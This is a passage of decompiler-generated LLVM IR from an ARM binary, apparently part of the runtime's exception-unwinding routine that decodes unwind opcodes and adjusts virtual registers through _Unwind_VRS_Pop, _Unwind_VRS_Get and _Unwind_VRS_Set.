  br i1 %v0_1b084.pr.pr, label %.thread52.dec_label_pc_1b088_crit_edge, label %dec_label_pc_1b0bc

.thread52.dec_label_pc_1b088_crit_edge:           ; preds = %.thread52
  %v0_1b088.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1b088

dec_label_pc_1b088:                               ; preds = %.thread52.dec_label_pc_1b088_crit_edge, %dec_label_pc_1b074
  %v2_1b0a0 = phi i32 [ %v0_1b088.pre, %.thread52.dec_label_pc_1b088_crit_edge ], [ %v0_1b074, %dec_label_pc_1b074 ]
  %v1_1b088 = add i32 %v2_1b0a0, 9
  %v2_1b088 = inttoptr i32 %v1_1b088 to i8*
  %v3_1b088 = load i8, i8* %v2_1b088, align 1
  %v4_1b088 = zext i8 %v3_1b088 to i32
  store i32 %v4_1b088, i32* %r3.global-to-local, align 4
  %v2_1b08c = icmp eq i8 %v3_1b088, 0
  store i1 %v2_1b08c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b08c, label %dec_label_pc_1b0d8, label %dec_label_pc_1b09c

dec_label_pc_1b09c:                               ; preds = %dec_label_pc_1b088
  %v1_1b09c = add nsw i32 %v4_1b088, -1
  store i32 %v1_1b09c, i32* %r3.global-to-local, align 4
  %v1_1b0a0 = trunc i32 %v1_1b09c to i8
  store i8 %v1_1b0a0, i8* %v2_1b088, align 1
  %v0_1b0a4 = load i32, i32* @r5, align 4
  %v1_1b0a4 = add i32 %v0_1b0a4, 4
  %v2_1b0a4 = inttoptr i32 %v1_1b0a4 to i32*
  %v3_1b0a4 = load i32, i32* %v2_1b0a4, align 4
  store i32 %v3_1b0a4, i32* %r2.global-to-local, align 4
  %v1_1b0a8 = inttoptr i32 %v3_1b0a4 to i32*
  %v2_1b0a8 = load i32, i32* %v1_1b0a8, align 4
  store i32 %v2_1b0a8, i32* %r0.global-to-local, align 4
  %v4_1b0a8 = add i32 %v3_1b0a4, 4
  store i32 %v4_1b0a8, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1b0a8, i32* %v2_1b0a4, align 4
  %v0_1b0b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b0b4 = trunc i32 %v0_1b0b4 to i8
  %v2_1b0b4 = load i32, i32* @r5, align 4
  %v3_1b0b4 = add i32 %v2_1b0b4, 8
  %v4_1b0b4 = inttoptr i32 %v3_1b0b4 to i8*
  store i8 %v1_1b0b4, i8* %v4_1b0b4, align 1
  %v0_1b0b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1b0b8 = load i32, i32* @r5, align 4
  %v2_1b0b8 = inttoptr i32 %v1_1b0b8 to i32*
  store i32 %v0_1b0b8, i32* %v2_1b0b8, align 4
  br label %dec_label_pc_1b0bc

dec_label_pc_1b0bc:                               ; preds = %.thread52, %dec_label_pc_1b09c
  %v0_1b0bc = load i32, i32* %r0.global-to-local, align 4
  %v3_1b0bc = udiv i32 %v0_1b0bc, 16777216
  %v1_1b0c0 = urem i32 %v3_1b0bc, 16
  %v3_1b0c4 = mul i32 %v0_1b0bc, 256
  store i32 %v3_1b0c4, i32* %r0.global-to-local, align 4
  %v1_1b0c8 = add nuw nsw i32 %v1_1b0c0, 1
  store i32 %v1_1b0c8, i32* %r2.global-to-local, align 4
  %v1_1b0cc = and i32 %v3_1b0bc, 240
  store i32 %v1_1b0cc, i32* %r3.global-to-local, align 4
  %v1_1b0d0 = load i32, i32* @r5, align 4
  %v2_1b0d0 = inttoptr i32 %v1_1b0d0 to i32*
  store i32 %v3_1b0c4, i32* %v2_1b0d0, align 4
  %v0_1b0d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b0d4 = load i32, i32* %r3.global-to-local, align 4
  %v4_1b0d4 = mul i32 %v1_1b0d4, 4096
  %v5_1b0d4 = or i32 %v4_1b0d4, %v0_1b0d4
  br label %dec_label_pc_1b0d8

dec_label_pc_1b0d8:                               ; preds = %dec_label_pc_1b088, %dec_label_pc_1b0bc
  %storemerge130 = phi i32 [ %v5_1b0d4, %dec_label_pc_1b0bc ], [ 720897, %dec_label_pc_1b088 ]
  store i32 %storemerge130, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1aeec

dec_label_pc_1b0e0:                               ; preds = %dec_label_pc_1ae0c
  %v0_1b0e0 = load i32, i32* @r5, align 4
  %v1_1b0e0 = add i32 %v0_1b0e0, 8
  %v2_1b0e0 = inttoptr i32 %v1_1b0e0 to i8*
  %v3_1b0e0 = load i8, i8* %v2_1b0e0, align 1
  %v4_1b0e0 = zext i8 %v3_1b0e0 to i32
  store i32 %v4_1b0e0, i32* %r3.global-to-local, align 4
  %v2_1b0e4 = icmp eq i8 %v3_1b0e0, 0
  store i1 %v2_1b0e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b0e4, label %dec_label_pc_1b28c, label %.thread56

.thread56:                                        ; preds = %dec_label_pc_1b0e0
  %v2_1b0e8 = add nsw i32 %v4_1b0e0, -1
  store i32 %v2_1b0e8, i32* %r3.global-to-local, align 4
  %v2_1b0ec = trunc i32 %v2_1b0e8 to i8
  store i8 %v2_1b0ec, i8* %v2_1b0e0, align 1
  %v0_1b0f0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1b0f0.pr.pr, label %.thread56.dec_label_pc_1b28c_crit_edge, label %dec_label_pc_1b0f4

.thread56.dec_label_pc_1b28c_crit_edge:           ; preds = %.thread56
  %v0_1b28c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1b28c

dec_label_pc_1b0f4:                               ; preds = %.thread56, %dec_label_pc_1b298
  %v0_1b0f4 = load i32, i32* %r0.global-to-local, align 4
  %v3_1b0f4 = udiv i32 %v0_1b0f4, 16777216
  store i32 %v3_1b0f4, i32* %r3.global-to-local, align 4
  store i32 %v3_1b0f4, i32* %r2.global-to-local, align 4
  %tmp184 = icmp ult i32 %v0_1b0f4, 16777216
  store i1 %tmp184, i1* %cpsr_z.global-to-local, align 1
  %v3_1b0fc = mul i32 %v0_1b0f4, 256
  store i32 %v3_1b0fc, i32* %r0.global-to-local, align 4
  %v1_1b100 = load i32, i32* @r5, align 4
  %v2_1b100 = inttoptr i32 %v1_1b100 to i32*
  store i32 %v3_1b0fc, i32* %v2_1b100, align 4
  br i1 %tmp184, label %dec_label_pc_1aebc, label %dec_label_pc_1b108

dec_label_pc_1b108:                               ; preds = %dec_label_pc_1b0f4
  %v0_1b108 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b108 = and i32 %v0_1b108, 240
  store i32 %v1_1b108, i32* %r3.global-to-local, align 4
  %v2_1b108 = icmp eq i32 %v1_1b108, 0
  store i1 %v2_1b108, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b108, label %dec_label_pc_1b110, label %dec_label_pc_1aebc

dec_label_pc_1b110:                               ; preds = %dec_label_pc_1b108
  %v0_1b110 = load i32, i32* @r7, align 4
  store i32 %v0_1b110, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_1b118 = load i32, i32* %r2.global-to-local, align 4
  %v4_1b118 = call i32 @_Unwind_VRS_Pop(i32 %v0_1b110, i32 4, i32 %v2_1b118, i32 0)
  store i32 %v4_1b118, i32* %r0.global-to-local, align 4
  %v2_1b11c = icmp eq i32 %v4_1b118, 0
  store i1 %v2_1b11c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b11c, label %dec_label_pc_1abec.backedge, label %dec_label_pc_1b124

dec_label_pc_1b124:                               ; preds = %dec_label_pc_1b110
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ad14

dec_label_pc_1b12c:                               ; preds = %dec_label_pc_1af58
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1b138 = load i32, i32* @r7, align 4
  store i32 %v0_1b138, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_1b144 = call i32 @_Unwind_VRS_Get(i32 %v0_1b138, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1b144, i32* %r0.global-to-local, align 4
  %v0_1b148 = load i32, i32* @r5, align 4
  %v1_1b148 = add i32 %v0_1b148, 8
  %v2_1b148 = inttoptr i32 %v1_1b148 to i8*
  %v3_1b148 = load i8, i8* %v2_1b148, align 1
  %v4_1b148 = zext i8 %v3_1b148 to i32
  store i32 %v4_1b148, i32* %r1.global-to-local, align 4
  %v2_1b14c = icmp eq i8 %v3_1b148, 0
  store i1 %v2_1b14c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b14c, label %dec_label_pc_1b15c, label %.thread58

.thread58:                                        ; preds = %dec_label_pc_1b12c
  %v2_1b150 = add nsw i32 %v4_1b148, -1
  store i32 %v2_1b150, i32* %r3.global-to-local, align 4
  %v2_1b154 = trunc i32 %v2_1b150 to i8
  store i8 %v2_1b154, i8* %v2_1b148, align 1
  %v0_1b158.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1b158.pr.pr, label %.thread58.dec_label_pc_1b15c_crit_edge, label %dec_label_pc_1b188

.thread58.dec_label_pc_1b15c_crit_edge:           ; preds = %.thread58
  %v0_1b15c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1b15c

dec_label_pc_1b15c:                               ; preds = %.thread58.dec_label_pc_1b15c_crit_edge, %dec_label_pc_1b12c
  %v2_1b170 = phi i32 [ %v0_1b15c.pre, %.thread58.dec_label_pc_1b15c_crit_edge ], [ %v0_1b148, %dec_label_pc_1b12c ]
  %v1_1b15c = add i32 %v2_1b170, 9
  %v2_1b15c = inttoptr i32 %v1_1b15c to i8*
  %v3_1b15c = load i8, i8* %v2_1b15c, align 1
  %v4_1b15c = zext i8 %v3_1b15c to i32
  store i32 %v4_1b15c, i32* %r3.global-to-local, align 4
  %v2_1b160 = icmp eq i8 %v3_1b15c, 0
  store i1 %v2_1b160, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b160, label %bb158, label %dec_label_pc_1b16c

bb158:                                            ; preds = %dec_label_pc_1b15c
  %v1_1b164 = load i32, i32* @r6, align 4
  store i32 %v1_1b164, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b1b0

dec_label_pc_1b16c:                               ; preds = %dec_label_pc_1b15c
  %v1_1b16c = add nsw i32 %v4_1b15c, -1
  store i32 %v1_1b16c, i32* %r3.global-to-local, align 4
  %v1_1b170 = trunc i32 %v1_1b16c to i8
  store i8 %v1_1b170, i8* %v2_1b15c, align 1
  %v0_1b174 = load i32, i32* @r5, align 4
  %v1_1b174 = add i32 %v0_1b174, 4
  %v2_1b174 = inttoptr i32 %v1_1b174 to i32*
  %v3_1b174 = load i32, i32* %v2_1b174, align 4
  store i32 %v3_1b174, i32* %r2.global-to-local, align 4
  %v1_1b178 = inttoptr i32 %v3_1b174 to i32*
  %v2_1b178 = load i32, i32* %v1_1b178, align 4
  store i32 %v2_1b178, i32* %r0.global-to-local, align 4
  %v4_1b178 = add i32 %v3_1b174, 4
  store i32 %v4_1b178, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_1b180 = inttoptr i32 %v0_1b174 to i32*
  store i32 %v2_1b178, i32* %v1_1b180, align 4
  %v5_1b180 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_1b180, i32* %v2_1b174, align 4
  %v0_1b184 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b184 = trunc i32 %v0_1b184 to i8
  %v2_1b184 = load i32, i32* @r5, align 4
  %v3_1b184 = add i32 %v2_1b184, 8
  %v4_1b184 = inttoptr i32 %v3_1b184 to i8*
  store i8 %v1_1b184, i8* %v4_1b184, align 1
  br label %dec_label_pc_1b188

dec_label_pc_1b188:                               ; preds = %.thread58, %dec_label_pc_1b16c
  %v0_1b188 = load i32, i32* @r5, align 4
  %v1_1b188 = inttoptr i32 %v0_1b188 to i32*
  %v2_1b188 = load i32, i32* %v1_1b188, align 4
  store i32 %v2_1b188, i32* %r3.global-to-local, align 4
  %v3_1b18c = mul i32 %v2_1b188, 256
  store i32 %v3_1b18c, i32* %r0.global-to-local, align 4
  %v3_1b190 = udiv i32 %v2_1b188, 16777216
  store i32 %v3_1b190, i32* %r2.global-to-local, align 4
  store i32 %v3_1b18c, i32* %v1_1b188, align 4
  %v0_1b198 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b198 = and i32 %v0_1b198, 128
  %v2_1b198 = icmp eq i32 %v1_1b198, 0
  store i1 %v2_1b198, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b198, label %.thread129, label %dec_label_pc_1b1ac

.thread129:                                       ; preds = %dec_label_pc_1b188
  %v4_1b19c = load i32, i32* %stack_var_-36, align 4
  store i32 %v4_1b19c, i32* %ip.global-to-local, align 4
  %v1_1b1a0 = urem i32 %v0_1b198, 256
  store i32 %v1_1b1a0, i32* %r2.global-to-local, align 4
  store i32 2, i32* @lr, align 4
  br label %dec_label_pc_1b220

dec_label_pc_1b1ac:                               ; preds = %dec_label_pc_1b188
  %v1_1b1a063 = urem i32 %v0_1b198, 256
  store i32 %v1_1b1a063, i32* %r2.global-to-local, align 4
  %v0_1b1ac = load i32, i32* @r5, align 4
  %v1_1b1ac = add i32 %v0_1b1ac, 8
  %v2_1b1ac = inttoptr i32 %v1_1b1ac to i8*
  %v3_1b1ac = load i8, i8* %v2_1b1ac, align 1
  %v4_1b1ac = zext i8 %v3_1b1ac to i32
  store i32 %v4_1b1ac, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1b1b0

dec_label_pc_1b1b0:                               ; preds = %bb158, %dec_label_pc_1b1ac
  %v3_1b1d099 = phi i32 [ %v2_1b170, %bb158 ], [ %v0_1b1ac, %dec_label_pc_1b1ac ]
  %v0_1b1b892 = phi i32 [ %v1_1b164, %bb158 ], [ %v1_1b1a063, %dec_label_pc_1b1ac ]
  %v3_1b1b0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_1b1b0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1b1b8

dec_label_pc_1b1b8:                               ; preds = %dec_label_pc_1b1b8.backedge, %dec_label_pc_1b1b0
  %v3_1b1d0 = phi i32 [ %v3_1b1d0100, %dec_label_pc_1b1b8.backedge ], [ %v3_1b1d099, %dec_label_pc_1b1b0 ]
  %v0_1b1cc = phi i32 [ %v2_1b1bc.pre, %dec_label_pc_1b1b8.backedge ], [ 2, %dec_label_pc_1b1b0 ]
  %v0_1b1bc = phi i32 [ %v0_1b1bc.pre, %dec_label_pc_1b1b8.backedge ], [ %v3_1b1b0, %dec_label_pc_1b1b0 ]
  %v0_1b1b8 = phi i32 [ %v0_1b1b895, %dec_label_pc_1b1b8.backedge ], [ %v0_1b1b892, %dec_label_pc_1b1b0 ]
  %v1_1b1b8 = urem i32 %v0_1b1b8, 128
  %v7_1b1bc = shl i32 %v1_1b1b8, %v0_1b1cc
  %v8_1b1bc = add i32 %v7_1b1bc, %v0_1b1bc
  store i32 %v8_1b1bc, i32* %ip.global-to-local, align 4
  %v0_1b1c0 = load i32, i32* %r1.global-to-local, align 4
  %v2_1b1c0 = icmp eq i32 %v0_1b1c0, 0
  store i1 %v2_1b1c0, i1* %cpsr_z.global-to-local, align 1
  %v1_1b1c4 = add i32 %v0_1b1c0, -1
  store i32 %v1_1b1c4, i32* %r3.global-to-local, align 4
  store i32 %v8_1b1bc, i32* %stack_var_-36, align 4
  %v1_1b1cc = add i32 %v0_1b1cc, 7
  store i32 %v1_1b1cc, i32* @lr, align 4
  br i1 %v2_1b1c0, label %dec_label_pc_1b1d8, label %bb159

bb159:                                            ; preds = %dec_label_pc_1b1b8
  %v2_1b1d0 = trunc i32 %v1_1b1c4 to i8
  %v4_1b1d0 = add i32 %v3_1b1d0, 8
  %v5_1b1d0 = inttoptr i32 %v4_1b1d0 to i8*
  store i8 %v2_1b1d0, i8* %v5_1b1d0, align 1
  %v0_1b1d4.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1b1d4.pr, label %.dec_label_pc_1b1d8_crit_edge, label %dec_label_pc_1b204

.dec_label_pc_1b1d8_crit_edge:                    ; preds = %bb159
  %v0_1b1d8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1b1d8

dec_label_pc_1b1d8:                               ; preds = %.dec_label_pc_1b1d8_crit_edge, %dec_label_pc_1b1b8
  %v2_1b1f0 = phi i32 [ %v0_1b1d8.pre, %.dec_label_pc_1b1d8_crit_edge ], [ %v3_1b1d0, %dec_label_pc_1b1b8 ]
  %v1_1b1d8 = add i32 %v2_1b1f0, 9
  %v2_1b1d8 = inttoptr i32 %v1_1b1d8 to i8*
  %v3_1b1d8 = load i8, i8* %v2_1b1d8, align 1
  %v4_1b1d8 = zext i8 %v3_1b1d8 to i32
  store i32 %v4_1b1d8, i32* %r3.global-to-local, align 4
  %v2_1b1dc = icmp eq i8 %v3_1b1d8, 0
  store i1 %v2_1b1dc, i1* %cpsr_z.global-to-local, align 1
  %v1_1b1e0 = add nsw i32 %v4_1b1d8, -1
  store i32 %v1_1b1e0, i32* %r0.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  br i1 %v2_1b1dc, label %dec_label_pc_1b1b8.backedge, label %dec_label_pc_1b1ec

dec_label_pc_1b1ec:                               ; preds = %dec_label_pc_1b1d8
  %v1_1b1ec = add i32 %v2_1b1f0, 4
  %v2_1b1ec = inttoptr i32 %v1_1b1ec to i32*
  %v3_1b1ec = load i32, i32* %v2_1b1ec, align 4
  store i32 %v3_1b1ec, i32* %r2.global-to-local, align 4
  %v1_1b1f0 = trunc i32 %v1_1b1e0 to i8
  store i8 %v1_1b1f0, i8* %v2_1b1d8, align 1
  %v0_1b1f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b1f4 = inttoptr i32 %v0_1b1f4 to i32*
  %v2_1b1f4 = load i32, i32* %v1_1b1f4, align 4
  store i32 %v2_1b1f4, i32* %r0.global-to-local, align 4
  %v4_1b1f4 = add i32 %v0_1b1f4, 4
  store i32 %v4_1b1f4, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v2_1b1fc = load i32, i32* @r5, align 4
  %v3_1b1fc = add i32 %v2_1b1fc, 8
  %v4_1b1fc = inttoptr i32 %v3_1b1fc to i8*
  store i8 3, i8* %v4_1b1fc, align 1
  %v0_1b200 = load i32, i32* @r5, align 4
  %v1_1b200 = inttoptr i32 %v0_1b200 to i32*
  %v2_1b200 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_1b200, i32* %v1_1b200, align 4
  %v3_1b200 = add i32 %v0_1b200, 4
  %v4_1b200 = inttoptr i32 %v3_1b200 to i32*
  %v5_1b200 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_1b200, i32* %v4_1b200, align 4
  br label %dec_label_pc_1b204

dec_label_pc_1b204:                               ; preds = %bb159, %dec_label_pc_1b1ec
  %v0_1b204 = load i32, i32* @r5, align 4
  %v1_1b204 = inttoptr i32 %v0_1b204 to i32*
  %v2_1b204 = load i32, i32* %v1_1b204, align 4
  store i32 %v2_1b204, i32* %r3.global-to-local, align 4
  %v3_1b208 = udiv i32 %v2_1b204, 16777216
  store i32 %v3_1b208, i32* %r2.global-to-local, align 4
  %v1_1b20c = and i32 %v3_1b208, 128
  %v2_1b20c = icmp eq i32 %v1_1b20c, 0
  store i1 %v2_1b20c, i1* %cpsr_z.global-to-local, align 1
  %v3_1b210 = mul i32 %v2_1b204, 256
  store i32 %v3_1b210, i32* %r0.global-to-local, align 4
  store i32 %v3_1b210, i32* %v1_1b204, align 4
  %v0_1b218 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b218 = urem i32 %v0_1b218, 256
  store i32 %v1_1b218, i32* %r2.global-to-local, align 4
  br i1 %v2_1b20c, label %dec_label_pc_1b220.loopexit, label %dec_label_pc_1b24c

dec_label_pc_1b220.loopexit:                      ; preds = %dec_label_pc_1b204
  %v0_1b224.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_1b228.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_1b220

dec_label_pc_1b220:                               ; preds = %dec_label_pc_1b220.loopexit, %.thread129
  %v2_1b228 = phi i32 [ 2, %.thread129 ], [ %v2_1b228.pre, %dec_label_pc_1b220.loopexit ]
  %v0_1b224 = phi i32 [ %v4_1b19c, %.thread129 ], [ %v0_1b224.pre, %dec_label_pc_1b220.loopexit ]
  %v0_1b220 = phi i32 [ %v1_1b1a0, %.thread129 ], [ %v1_1b218, %dec_label_pc_1b220.loopexit ]
  %v1_1b220 = urem i32 %v0_1b220, 128
  %v1_1b224 = add i32 %v0_1b224, 516
  %v7_1b228 = shl i32 %v1_1b220, %v2_1b228
  %v8_1b228 = add i32 %v1_1b224, %v7_1b228
  store i32 %v8_1b228, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_1b230 = load i32, i32* @r7, align 4
  store i32 %v0_1b230, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v8_1b228, i32* %stack_var_-36, align 4
  %v5_1b244 = call i32 @_Unwind_VRS_Set(i32 %v0_1b230, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1b244, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1abec.backedge

dec_label_pc_1b24c:                               ; preds = %dec_label_pc_1b204
  %v0_1b24c = load i32, i32* @r5, align 4
  %v1_1b24c = add i32 %v0_1b24c, 8
  %v2_1b24c = inttoptr i32 %v1_1b24c to i8*
  %v3_1b24c = load i8, i8* %v2_1b24c, align 1
  %v4_1b24c = zext i8 %v3_1b24c to i32
  store i32 %v4_1b24c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1b1b8.backedge

dec_label_pc_1b1b8.backedge:                      ; preds = %dec_label_pc_1b24c, %dec_label_pc_1b1d8
  %v3_1b1d0100 = phi i32 [ %v0_1b24c, %dec_label_pc_1b24c ], [ %v2_1b1f0, %dec_label_pc_1b1d8 ]
  %v0_1b1b895 = phi i32 [ %v1_1b218, %dec_label_pc_1b24c ], [ 176, %dec_label_pc_1b1d8 ]
  %v0_1b1bc.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_1b1bc.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_1b1b8

dec_label_pc_1b254:                               ; preds = %dec_label_pc_1af50
  %v0_1b254 = load i32, i32* @r5, align 4
  %v1_1b254 = add i32 %v0_1b254, 8
  %v2_1b254 = inttoptr i32 %v1_1b254 to i8*
  %v3_1b254 = load i8, i8* %v2_1b254, align 1
  %v4_1b254 = zext i8 %v3_1b254 to i32
  store i32 %v4_1b254, i32* %r3.global-to-local, align 4
  %v2_1b258 = icmp eq i8 %v3_1b254, 0
  store i1 %v2_1b258, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b258, label %dec_label_pc_1b2bc, label %.thread66

.thread66:                                        ; preds = %dec_label_pc_1b254
  %v2_1b25c = add nsw i32 %v4_1b254, -1
  store i32 %v2_1b25c, i32* %r3.global-to-local, align 4
  %v2_1b260 = trunc i32 %v2_1b25c to i8
  store i8 %v2_1b260, i8* %v2_1b254, align 1
  %v0_1b264.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1b264.pr.pr, label %.thread66.dec_label_pc_1b2bc_crit_edge, label %dec_label_pc_1b268

.thread66.dec_label_pc_1b2bc_crit_edge:           ; preds = %.thread66
  %v0_1b2bc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1b2bc

dec_label_pc_1b268:                               ; preds = %.thread66, %dec_label_pc_1b2c8
  %v0_1b268 = load i32, i32* %r0.global-to-local, align 4
  %v3_1b268 = udiv i32 %v0_1b268, 16777216
  store i32 %v3_1b268, i32* %r3.global-to-local, align 4
  store i32 %v3_1b268, i32* %r2.global-to-local, align 4
  %tmp185 = icmp ult i32 %v0_1b268, 16777216
  store i1 %tmp185, i1* %cpsr_z.global-to-local, align 1
  %v3_1b270 = mul i32 %v0_1b268, 256
  store i32 %v3_1b270, i32* %r0.global-to-local, align 4
  %v1_1b274 = load i32, i32* @r5, align 4
  %v2_1b274 = inttoptr i32 %v1_1b274 to i32*
  store i32 %v3_1b270, i32* %v2_1b274, align 4
  br i1 %tmp185, label %dec_label_pc_1aebc, label %dec_label_pc_1b27c

dec_label_pc_1b27c:                               ; preds = %dec_label_pc_1b268
  %v0_1b27c = load i32, i32* %r3.global-to-local, align 4
  %v1_1b27c = and i32 %v0_1b27c, 240
  store i32 %v1_1b27c, i32* %r1.global-to-local, align 4
  %v2_1b27c = icmp eq i32 %v1_1b27c, 0
  store i1 %v2_1b27c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b27c, label %dec_label_pc_1b27c.dec_label_pc_1aeec_crit_edge, label %dec_label_pc_1b284

dec_label_pc_1b27c.dec_label_pc_1aeec_crit_edge:  ; preds = %dec_label_pc_1b27c
  %v2_1aef4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1aeec

dec_label_pc_1b284:                               ; preds = %dec_label_pc_1b27c
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ad14

dec_label_pc_1b28c:                               ; preds = %.thread56.dec_label_pc_1b28c_crit_edge, %dec_label_pc_1b0e0
  %v2_1b29c = phi i32 [ %v0_1b28c.pre, %.thread56.dec_label_pc_1b28c_crit_edge ], [ %v0_1b0e0, %dec_label_pc_1b0e0 ]
  %v1_1b28c = add i32 %v2_1b29c, 9
  %v2_1b28c = inttoptr i32 %v1_1b28c to i8*
  %v3_1b28c = load i8, i8* %v2_1b28c, align 1
  %v4_1b28c = zext i8 %v3_1b28c to i32
  store i32 %v4_1b28c, i32* %r3.global-to-local, align 4
  %v2_1b290 = icmp eq i8 %v3_1b28c, 0
  store i1 %v2_1b290, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b290, label %dec_label_pc_1aebc, label %dec_label_pc_1b298

dec_label_pc_1b298:                               ; preds = %dec_label_pc_1b28c
  %v1_1b298 = add nsw i32 %v4_1b28c, -1
  store i32 %v1_1b298, i32* %r3.global-to-local, align 4
  %v1_1b29c = trunc i32 %v1_1b298 to i8
  store i8 %v1_1b29c, i8* %v2_1b28c, align 1
  %v0_1b2a0 = load i32, i32* @r5, align 4
  %v1_1b2a0 = add i32 %v0_1b2a0, 4
  %v2_1b2a0 = inttoptr i32 %v1_1b2a0 to i32*
  %v3_1b2a0 = load i32, i32* %v2_1b2a0, align 4
  store i32 %v3_1b2a0, i32* %r2.global-to-local, align 4
  %v1_1b2a4 = inttoptr i32 %v3_1b2a0 to i32*
  %v2_1b2a4 = load i32, i32* %v1_1b2a4, align 4
  store i32 %v2_1b2a4, i32* %r0.global-to-local, align 4
  %v4_1b2a4 = add i32 %v3_1b2a0, 4
  store i32 %v4_1b2a4, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1b2a4, i32* %v2_1b2a0, align 4
  %v0_1b2b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b2b0 = trunc i32 %v0_1b2b0 to i8
  %v2_1b2b0 = load i32, i32* @r5, align 4
  %v3_1b2b0 = add i32 %v2_1b2b0, 8
  %v4_1b2b0 = inttoptr i32 %v3_1b2b0 to i8*
  store i8 %v1_1b2b0, i8* %v4_1b2b0, align 1
  %v0_1b2b4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1b2b4 = load i32, i32* @r5, align 4
  %v2_1b2b4 = inttoptr i32 %v1_1b2b4 to i32*
  store i32 %v0_1b2b4, i32* %v2_1b2b4, align 4
  br label %dec_label_pc_1b0f4

dec_label_pc_1b2bc:                               ; preds = %.thread66.dec_label_pc_1b2bc_crit_edge, %dec_label_pc_1b254
  %v2_1b2cc = phi i32 [ %v0_1b2bc.pre, %.thread66.dec_label_pc_1b2bc_crit_edge ], [ %v0_1b254, %dec_label_pc_1b254 ]
  %v1_1b2bc = add i32 %v2_1b2cc, 9
  %v2_1b2bc = inttoptr i32 %v1_1b2bc to i8*
  %v3_1b2bc = load i8, i8* %v2_1b2bc, align 1
  %v4_1b2bc = zext i8 %v3_1b2bc to i32
  store i32 %v4_1b2bc, i32* %r3.global-to-local, align 4
  %v2_1b2c0 = icmp eq i8 %v3_1b2bc, 0
  store i1 %v2_1b2c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b2c0, label %dec_label_pc_1aebc, label %dec_label_pc_1b2c8

dec_label_pc_1b2c8:                               ; preds = %dec_label_pc_1b2bc
  %v1_1b2c8 = add nsw i32 %v4_1b2bc, -1
  store i32 %v1_1b2c8, i32* %r3.global-to-local, align 4
  %v1_1b2cc = trunc i32 %v1_1b2c8 to i8
  store i8 %v1_1b2cc, i8* %v2_1b2bc, align 1
  %v0_1b2d0 = load i32, i32* @r5, align 4
  %v1_1b2d0 = add i32 %v0_1b2d0, 4
  %v2_1b2d0 = inttoptr i32 %v1_1b2d0 to i32*
  %v3_1b2d0 = load i32, i32* %v2_1b2d0, align 4
  store i32 %v3_1b2d0, i32* %r2.global-to-local, align 4
  %v1_1b2d4 = inttoptr i32 %v3_1b2d0 to i32*
  %v2_1b2d4 = load i32, i32* %v1_1b2d4, align 4
  store i32 %v2_1b2d4, i32* %r0.global-to-local, align 4
  %v4_1b2d4 = add i32 %v3_1b2d0, 4
  store i32 %v4_1b2d4, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
